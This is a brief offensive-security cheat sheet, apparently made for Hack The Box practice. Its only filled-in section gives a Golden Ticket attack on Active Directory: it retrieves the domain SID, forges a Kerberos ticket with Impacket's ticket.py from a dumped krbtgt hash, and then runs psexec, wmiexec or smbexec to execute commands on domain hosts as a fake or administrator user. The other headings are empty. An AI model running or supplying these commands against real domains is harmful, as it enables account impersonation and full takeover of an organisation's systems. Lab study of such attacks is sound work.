# Cheat Sheet

## AS-REP Roast

## Kerberoast

## Silver Ticket

## Golden Ticket

### From Linux

#### Impacket

After dumping the hashes, we will use the `krbtgt` user and hash that was found.

```bash
# From Target: Get Domain SID via PowerShell cmdlet
Get-ADDomain htb.local  # Look for DomainSID
# From Kali
python ticket.py <nt-hash> -domain-sid <DomainSID> -domain htb.local <fake-username>
export KRB5CCNAME=<fake-username>.cache
# Then use psexec
psexec.py htb.local/<fake-username>@<IP> -k -no-pass  # Using IP
psexec.py htb.local/<fake-username>@<DOMAIN> -k -no-pass  # May need to user domain
# DEBUG
## Redo steps replaceing <fake-username> with administrator
# Can also try wmiexec, smbexec
```

#### Mimikatz
